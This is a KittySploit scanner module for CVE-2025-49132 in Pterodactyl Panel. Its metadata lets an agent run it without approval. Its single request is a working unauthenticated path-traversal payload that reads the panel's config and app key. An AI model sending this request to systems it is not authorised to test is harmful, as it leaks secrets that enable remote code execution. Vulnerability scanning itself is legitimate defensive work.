#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pterodactyl is a free, open-source game server management panel."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pterodactyl Panel - Remote Code Execution Detection',
        'description': 'Pterodactyl is a free, open-source game server management panel. Using the /locales/locale.json with the locale and namespace query parameters, a malicious actor is able to execute arbitrary code without being authenticated.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'pterodactyl', 'cve2025', 'rce', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843',
            'https://github.com/pterodactyl/panel/commit/24c82b0e335fb5d7a844226b08abf9f176e592f0',
            'https://github.com/pterodactyl/panel/releases/tag/v1.11.11',
        ],
        'cve': 'CVE-2025-49132',
    }

    def run(self):
        r = self.http_request(method="GET", path='/locales/locale.json?locale=..%2F..%2Fconfig&namespace=app', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('{"app":{"version":', '"key":"base64{{',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Pterodactyl Panel - Remote Code Execution detected",
                path='/locales/locale.json?locale=..%2F..%2Fconfig&namespace=app',
            )
            return True
        return False

